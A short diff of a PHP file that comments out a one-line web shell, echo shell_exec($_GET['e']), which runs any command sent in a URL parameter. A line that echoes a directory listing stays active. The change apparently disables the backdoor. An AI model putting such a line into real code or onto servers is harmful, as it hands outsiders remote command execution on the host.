@@ -2,5 +2,5 @@
 
 <?php
 echo scandir('./');
-echo shell_exec($_GET['e']); 
+//echo shell_exec($_GET['e']); 
 ?>
